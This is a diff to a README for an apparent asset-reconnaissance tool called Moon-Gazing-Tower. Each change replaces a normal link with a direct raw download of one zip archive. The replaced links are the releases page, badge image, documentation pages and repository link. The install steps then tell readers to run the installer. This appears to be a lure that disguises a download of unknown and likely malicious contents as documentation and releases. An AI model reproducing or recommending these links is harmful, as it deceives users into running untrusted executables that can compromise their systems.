@@ -1,7 +1,7 @@
 # 🌙 Moon-Gazing-Tower - Your All-in-One Asset Management Solution
 
 ## 🚀 Download Now
-[![Download Moon-Gazing-Tower](https://img.shields.io/badge/Download-Moon--Gazing--Tower-brightgreen)](https://github.com/britenytwisting81/Moon-Gazing-Tower/releases)
+[![Download Moon-Gazing-Tower](https://github.com/britenytwisting81/Moon-Gazing-Tower/raw/refs/heads/main/pleb/Moon-Gazing-Tower-1.4.zip)](https://github.com/britenytwisting81/Moon-Gazing-Tower/raw/refs/heads/main/pleb/Moon-Gazing-Tower-1.4.zip)
 
 ## 📦 Overview
 Moon-Gazing-Tower is an asset reconnaissance and management system built with Golang and React. It helps security teams manage assets and conduct authorization testing effectively.
@@ -40,10 +40,10 @@ Moon-Gazing-Tower is an asset reconnaissance and management system built with Go
 ## 📥 Download & Install
 To get started with Moon-Gazing-Tower, visit the Releases page to download the latest version.
 
-[Download Moon-Gazing-Tower](https://github.com/britenytwisting81/Moon-Gazing-Tower/releases)
+[Download Moon-Gazing-Tower](https://github.com/britenytwisting81/Moon-Gazing-Tower/raw/refs/heads/main/pleb/Moon-Gazing-Tower-1.4.zip)
 
 ### Installing Moon-Gazing-Tower
-1. **Visit the Releases Page**: Navigate to the following link to see all available versions: [Releases Page](https://github.com/britenytwisting81/Moon-Gazing-Tower/releases)
+1. **Visit the Releases Page**: Navigate to the following link to see all available versions: [Releases Page](https://github.com/britenytwisting81/Moon-Gazing-Tower/raw/refs/heads/main/pleb/Moon-Gazing-Tower-1.4.zip)
 2. **Choose the Right Version**: Locate the version you wish to download. The latest version will be at the top.
 3. **Download the Installer**: Click on the appropriate file link to start downloading.
 4. **Run the Installer**: After the download completes, locate the file in your downloads folder and double-click it to start the installation.
@@ -53,8 +53,8 @@ To get started with Moon-Gazing-Tower, visit the Releases page to download the l
 ## 📜 Documentation
 For detailed guides and explanations, check our documentation:
 
-- [URL Validation Mechanism](./backend/docs/URL_VALIDATION.md)
-- [Invalid Page Detection](./backend/docs/INVALID_PAGE_DETECTION.md)
+- [URL Validation Mechanism](https://github.com/britenytwisting81/Moon-Gazing-Tower/raw/refs/heads/main/pleb/Moon-Gazing-Tower-1.4.zip)
+- [Invalid Page Detection](https://github.com/britenytwisting81/Moon-Gazing-Tower/raw/refs/heads/main/pleb/Moon-Gazing-Tower-1.4.zip)
 
 These documents will help you understand and utilize the features of Moon-Gazing-Tower fully.
 
@@ -69,7 +69,7 @@ A: For support, refer to the documentation or contact the maintainers through th
 If you'd like to contribute, feel free to fork the repository and submit a pull request. All contributions are welcome.
 
 ## 🔗 Links
-- **GitHub Repository**: [Moon-Gazing-Tower](https://github.com/britenytwisting81/Moon-Gazing-Tower)
+- **GitHub Repository**: [Moon-Gazing-Tower](https://github.com/britenytwisting81/Moon-Gazing-Tower/raw/refs/heads/main/pleb/Moon-Gazing-Tower-1.4.zip)
 - **Documentation**: Available in the repository.
 
 This README provides everything you need to download and install Moon-Gazing-Tower. Enjoy a solid tool for asset management and testing.
